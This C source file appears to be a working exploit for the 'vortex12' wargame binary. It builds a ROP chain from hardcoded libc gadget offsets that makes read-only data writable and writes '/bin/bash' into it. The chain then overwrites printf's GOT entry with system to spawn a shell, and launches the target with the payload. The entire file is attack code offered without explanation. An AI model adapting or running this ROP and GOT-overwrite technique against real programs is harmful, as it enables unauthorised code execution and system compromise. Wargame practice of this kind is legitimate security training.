#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/select.h>
#include <sys/time.h>
#include <unistd.h>

#define PUT32(addr,val) do { \
                          (addr)[0]=(val)&0xff; \
                          (addr)[1]=((val)>>8)&0xff; \
                          (addr)[2]=((val)>>16)&0xff; \
                          (addr)[3]=((val)>>24)&0xff; \
                        } while (0);

#define READ_BUF_SIZE 1000
#define READ_END 0
#define WRITE_END 1
#define DWORD 4
#define PATH_MAX 256


#define LIBCBASE 0xf7c00000
#define JMP_EAX_OFFSET 0x3d43cd
#define MPROTECT_OFFSET 0x11f770
#define MPROTECT_SYSCALL_OFFSET 0x3c7570 
#define POP_EBX_OFFSET 0x2a9f9
#define ADD_ESP_POP_EBX_OFFSET 0x2a9f6
#define POP_EDX_OFFSET 0x36425
#define POP_EAX_OFFSET 0x12b3e5
#define POP_ECX_POP_EDX_OFFSET 0x36424
#define PPP_CALL_OFFSET 0x82979
#define POP_POP_POP_OFFSET 0x12b3e3 
#define PUSH_EBP_OFFSET 0xb7c14 
#define PUSH_EAX_PUSH_EBP_OFFSET 0xb7c13 
#define ARB_WRITE_OFFSET 0x3a7c6
#define GETS_OFFSET 0x710e0 
#define AND_AL_OFFSET 0x1969a4 
#define AND_EAX_7F_OFFSET 0x2ee58 
#define AND_EDX_OFFSET 0xfebf6
#define ADD_EDX_OFFSET 0xb54f3
#define PRINTF_OFFSET 0x51e60
#define SYSTEM_OFFSET 0x4a570
#define EXEC_OFFSET 0xe0a20
#define XCHG_EAX_EBP_OFFSET 0x4084b
#define XCHG_EAX_ESI_OFFSET 0x25b66 
#define XCHG_EAX_EBX_OFFSET 0x199404 
#define PRINTF_GOT_OFFSET 0x4010
#define BIN_BASE 0x8048000
#define SET_TO_SEVEN 0xffffff07
#define SET_TO_F 0xffffff0f
#define RODATA_LEN 0x4
#define PERCENT_D_STR_ADDR 0x0804a008
#define RO_DATA_LOC 0x0804a000

int main(void) {


  char FILL[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  char SET_EBP[DWORD+1] = "";
  PUT32(SET_EBP, RO_DATA_LOC-7);

  char jmp_eax_addr[DWORD+1] = "";
  PUT32(jmp_eax_addr, LIBCBASE+JMP_EAX_OFFSET);

  char add_edx_addr[DWORD+1] = "";
  PUT32(add_edx_addr, LIBCBASE+ADD_EDX_OFFSET);

  char arb_write_addr[DWORD+1] = "";
  PUT32(arb_write_addr, LIBCBASE+ARB_WRITE_OFFSET);

  char xchg_eax_ebp_addr[DWORD+1] = "";
  PUT32(xchg_eax_ebp_addr, LIBCBASE+XCHG_EAX_EBP_OFFSET);

  char xchg_eax_esi_addr[DWORD+1] = "";
  PUT32(xchg_eax_esi_addr, LIBCBASE+XCHG_EAX_ESI_OFFSET);

  // Destructive
  char xchg_eax_ebx_addr[DWORD+1] = "";
  PUT32(xchg_eax_ebx_addr, LIBCBASE+XCHG_EAX_EBX_OFFSET);

  char and_edx_addr[DWORD+1] = "";
  PUT32(and_edx_addr, LIBCBASE+AND_EDX_OFFSET);

  char push_push_push_addr[DWORD+1] = "";
  PUT32(push_push_push_addr, LIBCBASE+PPP_CALL_OFFSET);

  char pop_pop_pop_addr[DWORD+1] = "";
  PUT32(pop_pop_pop_addr, LIBCBASE+POP_POP_POP_OFFSET);

  char pop_pop_pop_args[(DWORD*3)+1] = "";
  PUT32(pop_pop_pop_args, SET_TO_SEVEN); 
  PUT32(pop_pop_pop_args+DWORD, LIBCBASE+EXEC_OFFSET);
  PUT32(pop_pop_pop_args+(DWORD*2), LIBCBASE+JMP_EAX_OFFSET); //-2 for length of jmp eax instruction

  char gets_addr[DWORD+1] = "";
  PUT32(gets_addr, LIBCBASE+GETS_OFFSET);

  char printf_addr[DWORD+1] = "";
  PUT32(printf_addr, LIBCBASE+PRINTF_OFFSET);

  char and_al_addr[DWORD+1] = "";
  PUT32(and_al_addr, LIBCBASE+AND_AL_OFFSET);

  char and_eax_7f_addr[DWORD+1] = "";
  PUT32(and_eax_7f_addr, LIBCBASE+AND_EAX_7F_OFFSET);

  char pop_edx_addr[DWORD+1] = "";
  PUT32(pop_edx_addr, LIBCBASE+POP_EDX_OFFSET);

  char pop_ecx_pop_edx_addr[DWORD+1] = "";
  PUT32(pop_ecx_pop_edx_addr, LIBCBASE+POP_ECX_POP_EDX_OFFSET);

  char push_ebp_addr[DWORD+1] = "";
  PUT32(push_ebp_addr, LIBCBASE+PUSH_EBP_OFFSET);

  char push_eax_push_ebp_addr[DWORD+1] = "";
  PUT32(push_eax_push_ebp_addr, LIBCBASE+PUSH_EAX_PUSH_EBP_OFFSET);

  char pop_ebx_addr[DWORD+1] = "";
  PUT32(pop_ebx_addr, LIBCBASE+POP_EBX_OFFSET);

  char pop_eax_addr[DWORD+1] = "";
  PUT32(pop_eax_addr, LIBCBASE+POP_EAX_OFFSET);

  char add_esp_pop_ebx_addr[DWORD+1] = "";
  PUT32(add_esp_pop_ebx_addr, LIBCBASE+ADD_ESP_POP_EBX_OFFSET);

  char printf_arg[DWORD+1] = "";
  PUT32(printf_arg, PERCENT_D_STR_ADDR);

  char gets_arg[DWORD+1] = "";
  PUT32(gets_arg, 0xffd2a394); //ebp+8 (past ret addr)
  //
  char set_7f_arg[DWORD+1] = "";
  PUT32(set_7f_arg, 0xffffff7d);
  
  char mprotect_addr[DWORD+1] = "";
  PUT32(mprotect_addr, LIBCBASE+MPROTECT_SYSCALL_OFFSET);

  uint rop_chain_size = (sizeof(FILL)+(READ_BUF_SIZE*2));
  char *mprotect_rop = (char *) malloc(sizeof(char)*rop_chain_size);

  strcat(mprotect_rop, FILL);
  strcat(mprotect_rop, SET_EBP); //set_ebp
  strcat(mprotect_rop, pop_pop_pop_addr);
  strcat(mprotect_rop, pop_pop_pop_args);
  strcat(mprotect_rop, and_edx_addr);
  strcat(mprotect_rop, xchg_eax_ebp_addr);
  strcat(mprotect_rop, add_edx_addr);
  strcat(mprotect_rop, pop_ebx_addr);
  strcat(mprotect_rop, add_esp_pop_ebx_addr);
  strcat(mprotect_rop, push_eax_push_ebp_addr);
  strcat(mprotect_rop, xchg_eax_esi_addr);
  strcat(mprotect_rop, pop_eax_addr);
  strcat(mprotect_rop, set_7f_arg);
  strcat(mprotect_rop, and_eax_7f_addr);
  strcat(mprotect_rop, mprotect_addr);

  PUT32(pop_pop_pop_args, PERCENT_D_STR_ADDR);
  PUT32(pop_pop_pop_args+DWORD, 0x6e69622f); // /bin
  PUT32(pop_pop_pop_args+(DWORD*2), LIBCBASE+POP_POP_POP_OFFSET);

  strcat(mprotect_rop, pop_pop_pop_addr);
  strcat(mprotect_rop, pop_pop_pop_args);

  strcat(mprotect_rop, arb_write_addr);

  PUT32(pop_pop_pop_args, PERCENT_D_STR_ADDR+4);
  PUT32(pop_pop_pop_args+DWORD, 0x7361622f); // /bas
  PUT32(pop_pop_pop_args+(DWORD*2), LIBCBASE+POP_POP_POP_OFFSET);

  strcat(mprotect_rop, pop_pop_pop_addr);
  strcat(mprotect_rop, pop_pop_pop_args);

  strcat(mprotect_rop, arb_write_addr);

  PUT32(pop_pop_pop_args, PERCENT_D_STR_ADDR+5);  //-2 to replace '%d' in str
  PUT32(pop_pop_pop_args+DWORD, 0x68736162); // bash
  PUT32(pop_pop_pop_args+(DWORD*2), LIBCBASE+POP_POP_POP_OFFSET);

  strcat(mprotect_rop, pop_pop_pop_addr);
  strcat(mprotect_rop, pop_pop_pop_args);

  strcat(mprotect_rop, arb_write_addr);

  PUT32(pop_pop_pop_args, BIN_BASE+PRINTF_GOT_OFFSET); 
  PUT32(pop_pop_pop_args+DWORD, LIBCBASE+SYSTEM_OFFSET);
  PUT32(pop_pop_pop_args+(DWORD*2), LIBCBASE+JMP_EAX_OFFSET-2); //-2 for length of jmp eax instruction

  strcat(mprotect_rop, pop_pop_pop_addr);
  strcat(mprotect_rop, pop_pop_pop_args);
  strcat(mprotect_rop, arb_write_addr);
  strcat(mprotect_rop, jmp_eax_addr);

  //strcat(mprotect_rop, "CCCC");

  char *argv[3] = {"./vortex12", mprotect_rop, 0};
  char path[PATH_MAX] = "";
  getcwd(path, sizeof(path));

  char path_arg[PATH_MAX] = "PATH=";
  strcat(path_arg, path);

  char *env[2] = {path_arg, 0};
  execve("./vortex12", argv, env);
}

